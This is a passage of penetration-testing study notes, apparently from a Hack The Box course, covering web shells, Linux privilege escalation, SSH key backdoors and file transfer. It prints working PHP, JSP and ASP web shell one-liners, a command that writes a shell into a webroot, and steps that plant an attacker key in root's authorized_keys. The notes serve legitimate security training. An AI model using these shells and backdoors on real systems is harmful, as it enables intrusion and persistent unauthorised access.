www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.


#### Web Shell

The final type is `Web Shell`. This web shell is typically a web script (i.e PHP or ASPX) that accepts our command through HTTP req parameters such as `GET` or `POST` parameters, executes commands and prints its output back on web page.


#### Writing a Web Shell

First, we need to write our web shell that takes command through `Get`  request, execute it and print its output back. A web shell script is typically a one-liner that is very short and can be easily memorized.The following are some common short web shell scripts for common web languages:

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```

#### Uploading a Web Shell

Once we get a web shell , we can place our web shell script into remote host's web directory(webroot) to execute the script through web browser.This can be through a vuln in upload feature which allow us to write one of shells into file,i.e `shell.php` and upload it, then access our uploaded file to execute commands.

However, if we only have a rce through an exploit, we can write shell directly to webroot to access it over the web. So first step is to identify where webroot is. The following are the default webroots for common web servers:

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

```Shell-session
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

![UID, GID, and groups set to www-data.](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Another option is to use `cURL`:

```shell-session
0xWAYNE@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can keep changing the command to get our desired output or flag. A great benefit of web shell is it would bypass any firewall restrictions in place. Since it doesn't open a new connection on a port but runs on web port `80` or `443` or whatever port being used by web application. Another perk is even if the compromised host is rebooted, the web shell would still be in its place and we can access it and get command execution without exploiting remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.

---

## Task-6 PrivEsc

When we gain an initial access on remote host it gives access with low-privileges which would restrict us to perform few actions compared to root user. To gain full access, we must find an internal/local vuln that can escalate our privilege from low level user to `root` in linux environments or `Administrator/System` user on windows environment.


#### PrivEsc Checklists

Once we gain initial access to a box, we must thoroughly enumerate the box to find any potential potential vulns we can exploit to achieve higher privileged user. We can find many checklists online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both [Linux](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) and [Windows](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). One must start experimenting with these various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

---

#### Enumerating Scripts

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

<mark style="background: #BBFABBA6;">Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.</mark>

As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.

---
#### Kernel Exploits

If we encounter a server running an old OS, we can start by looking for potential kernel vulns that exist. Suppose the server is not being maintained with regular patches and latest updates. In that case it is likely vulnerable to specific kernel exploits found on unpatched version of linux and windows.

We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.

#### Vulnerable Software

Another thing we should look for is installed software. For example, we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.


#### User Privileges

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

1. Sudo
2. SUID
3. Windows Token Privileges

The `sudo` command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like `tcpdump`' or allow the user to access certain root-only directories. We can check what `sudo` privileges we have with the `sudo -l` command:

```shell-session
0xWAYNE@htb[/htb]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output says that we can run all commands with `sudo`, which gives us complete access, and we can use the `su` command with `sudo` to switch to the root user:

```shell-session
0xWAYNE@htb[/htb]$ sudo su -

[sudo] password for user1:
whoami
root
```

The above command requires a password to run any commands with `sudo`. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:

```shell-session
0xWAYNE@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says `user`, we can run `sudo` as that user and not as root. To do so, we can specify the user with `-u user`:

```shell-session
0xWAYNE@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the `sudo` privilege we have.

[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

#### Scheduled Tasks

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

#### Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

```shell-session
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

As we can see, the database password '`password123`' is exposed, which would allow us to log in to the local `mysql` databases and look for interesting information. We may also check for `Password Reuse`, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user.

We may also use the user credentials to `ssh` into the server as that user.

#### SSH Keys

Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```shell-session
0xWAYNE@htb[/htb]$ vim id_rsa
0xWAYNE@htb[/htb]$ chmod 600 id_rsa
0xWAYNE@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

<mark style="background: #BBFABBA6;">Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.</mark>

If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:


```shell-session
0xWAYNE@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:


```shell-session
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now, the remote server should allow us to log in as that user by using our private key:


```shell-session
0xWAYNE@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
```

---

## Task-7 Transferring Files

During a pentest we may have to transfer files such as scripts, exploits or data from local machine to  remote host or vice versa.While tools like Meterpreter allow us to upload command to upload a file but we need to learn how to do it through a rev shell.


#### Using wget

There are many methods to accomplish it. One is running a Python HTTP server on local machine then using wget or curl to download a file on remote host.Go to directory of the files that need to be transferred and run a python HTTP server.

Now that a listening server is setup, In remote machine use wget or cURL to download the file.


#### Using SCP

Another method is SCP if we obtained ssh creds for remote host. The syntax as follows

```shell-session
0xWAYNE@htb[/htb]$ scp <file-name> user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

#### Using Base64

In few cases we may not be able to send the file. For ex the remote host may have a firewall protection that prevents from downloading a file on our machine.In these tricky situations e can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

```shell-session
0xWAYNE@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

 ```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

#### Validating File Transfers

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

## Resources

#### Vulnerable Machines/Applications

There are many resources available to practice common web and network vulnerabilities in a safe, controlled setting. The following are some examples of purposefully vulnerable web applications and vulnerable machines that we can set up in a lab environment for extra practice.


| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities.                                                                                                                            |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

#### YouTube Channels

There are many YouTube channels out there that showcase penetration testing/hacking techniques. A few worth bookmarking are:


| [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)       | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques. |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)      | Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.                                                    |
| [STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)         | Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing                                   |
| [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) | Provides videos on a wide variety of technical infosec topics.<br>                                                                                           |

#### Blogs

There are too many blogs out there to list them all. If you do a Google search for a walkthrough of most any retired HTB box,These can be great for seeing another person's perspective on the same topic, especially if their posts contain "extra" information about the target that other blogs do not cover.  

One great blog worth checking out is [0xdf hacks stuff](https://0xdf.gitlab.io/). This blog has fantastic walkthroughs of most retired HTB boxes, each with a "Beyond Root" section covering some unique aspect of the box that the author noticed. The blog also has posts on various techniques, malware analysis, and write-ups from past CTF events.

#### Tutorial Websites

There are many tutorial websites out there for practicing fundamental IT skills, such as scripting.  
Two great tutorial websites are [Under The Wire](https://underthewire.tech/wargames) and [Over The Wire](https://overthewire.org/wargames/). These websites are set up to help train users on using both Windows `PowerShell` and the Linux command line, respectively, through various scenarios in a "war games" format.  
They take the user through various levels, consisting of tasks or challenges to training them on fundamental to advanced Windows and Linux command line usage and `Bash` and `PowerShell` scripting. These skills are paramount for anyone looking to succeed in this industry.

Pro Labs are large and can take a while to finish and learn all of their attack paths and security challenges. Each Pro Lab has a specific scenario and level of difficulty:

|Lab|Scenario|
|---|---|
|`Dante`|Beginner-friendly to learn common pentesting techniques and methodologies, common pentesting tools, and common vulnerabilities.|
|`Offshore`|Active Directory lab that simulates a real-world corporate network.|
|`Cybernetics`|Simulates a fully-upgraded and up-to-date Active Directory network environment, which is hardened against attacks. It is aimed at experienced penetration testers and Red Teamers.|
|`RastaLabs`|Red Team simulation environment, featuring a combination of attacking misconfigurations and simulated users.|
|`APTLabs`|This lab simulates a targeted attack by an external threat agent against an MSP (Managed Service Provider) and is the most advanced Pro Lab offered at this time.|


## Way Forward

After finishing all of the above, there are still many other checkboxes that we need to complete to keep learning, and `Hack The Box` is full of learning opportunities. Here are some ideas:

- [ ]  Root a Retired Easy Box  
    
- [ ]  Root a Retired Medium Box  
    
- [ ]  Root an Active Box  
    
- [ ]  Complete an Easy Challenge  
    
- [ ]  Share a Walkthrough of a Retired Box  
    
- [ ]  Complete Offensive Academy Modules  
    
- [ ]  Root Live Medium/Hard Boxes  
    
- [ ]  Complete A Track  
    
- [ ]  Win a `Hack The Box Battlegrounds` Battle  
    
- [ ]  Complete A Pro Lab


## Tips

Remember that enumeration is an iterative process. After performing our `Nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with `Nibbles`:

- Enumeration/Scanning with `Nmap` - perform a quick scan for open ports followed by a full port scan
    
- Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `Gobuster`
    
- If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.
    
- After identifying the technologies in use, use a tool such as `Searchsploit` to find public exploits or search on Google for manual exploitation techniques
    
- After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY
    
- Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials
    
- Organize this data offline to determine the various ways to escalate privileges to root on this target
    

There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.

There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.

Have fun, never stop learning, and do not forget to `think outside of the box`!